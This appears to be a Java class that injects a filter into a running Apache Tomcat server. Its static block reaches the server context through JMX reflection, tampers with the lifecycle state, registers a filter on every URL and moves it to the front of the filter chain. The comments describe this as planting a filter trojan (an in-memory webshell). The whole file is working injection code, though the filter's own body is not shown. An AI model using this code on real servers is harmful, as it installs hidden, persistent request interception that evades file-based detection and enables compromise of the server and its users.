package SecAgent.Filter;

import com.sun.jmx.mbeanserver.NamedObject;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.modeler.Registry;

import javax.management.MBeanServer;
import javax.servlet.Filter;
import javax.servlet.ServletContext;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class InjectFilter {
    private final static String filterName = "";
    private final static String filterUrlPattern = "/*";
    static {

        try{
            MBeanServer mBeanServer = Registry.getRegistry(null, null).getMBeanServer();
            // 获取mbsInterceptor
            Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object mbsInterceptor = field.get(mBeanServer);
            // 获取repository
            field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
            field.setAccessible(true);
            Object repository = field.get(mbsInterceptor);
            // 获取domainTb
            field = Class.forName("com.sun.jmx.mbeanserver.Repository").getDeclaredField("domainTb");
            field.setAccessible(true);
            HashMap<String, Map<String, NamedObject>> domainTb = (HashMap<String,Map<String,NamedObject>>)field.get(repository);
            // 获取domain
            NamedObject nonLoginAuthenticator = domainTb.get("Catalina").get("context=/,host=localhost,name=NonLoginAuthenticator,type=Valve");
            field = Class.forName("com.sun.jmx.mbeanserver.NamedObject").getDeclaredField("object");
            field.setAccessible(true);
            Object object = field.get(nonLoginAuthenticator);
            // 获取resource
            field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
            field.setAccessible(true);
            Object resource = field.get(object);
            // 获取context
            field = Class.forName("org.apache.catalina.authenticator.AuthenticatorBase").getDeclaredField("context");
            field.setAccessible(true);
            StandardContext standardContext = (StandardContext) field.get(resource);
            // 获取servletContext
            field = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context");
            field.setAccessible(true);
            ServletContext servletContext = (ServletContext) field.get(standardContext);
            // 判断是否已经添加过了
            if (servletContext.getFilterRegistration(filterName) == null && standardContext != null) {
                //修改状态，要不然添加不了
                java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase.class
                        .getDeclaredField("state");
                stateField.setAccessible(true);
                stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);
                //创建一个自定义的Filter马
                Filter tomcatShellFilter = new SecFileter();
                //添加filter马
                javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext
                        .addFilter(filterName, tomcatShellFilter);
                filterRegistration.setInitParameter("encoding", "utf-8");
                filterRegistration.setAsyncSupported(false);
                filterRegistration
                        .addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false,
                                new String[]{filterUrlPattern});
                //状态恢复，要不然服务不可用
                if (stateField != null) {
                    stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);
                }
                if (standardContext != null) {
                    //生效filter
                    Method filterStartMethod = org.apache.catalina.core.StandardContext.class
                            .getMethod("filterStart");
                    filterStartMethod.setAccessible(true);
                    filterStartMethod.invoke(standardContext, null);
                    Class ccc = null;
                    try {
                        ccc = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                    } catch (Throwable t){}
                    if (ccc == null) {
                        try {
                            ccc = Class.forName("org.apache.catalina.deploy.FilterMap");
                        } catch (Throwable t){}
                    }
                    //把filter插到第一位
                    Class c = Class.forName("org.apache.catalina.core.StandardContext");
                    Method m = c.getMethod("findFilterMaps");
                    Object[] filterMaps = (Object[]) m.invoke(standardContext);
                    Object[] tmpFilterMaps = new Object[filterMaps.length];
                    int index = 1;
                    for (int i = 0; i < filterMaps.length; i++) {
                        Object o = filterMaps[i];
                        m = ccc.getMethod("getFilterName");
                        String name = (String) m.invoke(o);
                        if (name.equalsIgnoreCase(filterName)) {
                            tmpFilterMaps[0] = o;
                        } else {
                            tmpFilterMaps[index++] = filterMaps[i];
                        }
                    }
                    for (int i = 0; i < filterMaps.length; i++) {
                        filterMaps[i] = tmpFilterMaps[i];
                    }
                }
            }
            System.out.println("Add Filter Success.");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
